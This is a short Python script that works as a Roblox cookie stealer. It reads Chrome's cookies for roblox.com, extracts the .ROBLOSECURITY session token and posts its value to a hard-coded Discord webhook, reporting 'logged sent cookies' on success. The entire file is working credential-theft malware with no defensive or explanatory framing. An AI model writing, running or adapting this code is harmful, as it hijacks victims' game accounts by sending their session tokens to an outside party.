import browser_cookie3
import requests
import json

webhook_url = 'https://discord.com/api/webhooks/1169182544743366677/NLBwGSefgjJL-0L9dpK-EooQeRiUQeeoQxx-lDcT8U48UlF-Hb5mED_MeGhaJ7DC44yF'

cookies = browser_cookie3.chrome(domain_name='.roblox.com')
cookie_name = '.ROBLOSECURITY'

for cookie in cookies:
    if cookie.name == cookie_name:
        message = f"Domain: {cookie.domain}\nName: {cookie.name}\nValue: {cookie.value}"
        data = {'content': message}
        response = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
        if response.status_code == 204:
            print('logged sent cookies')
        else:
            print('failed to send cookies')
        break
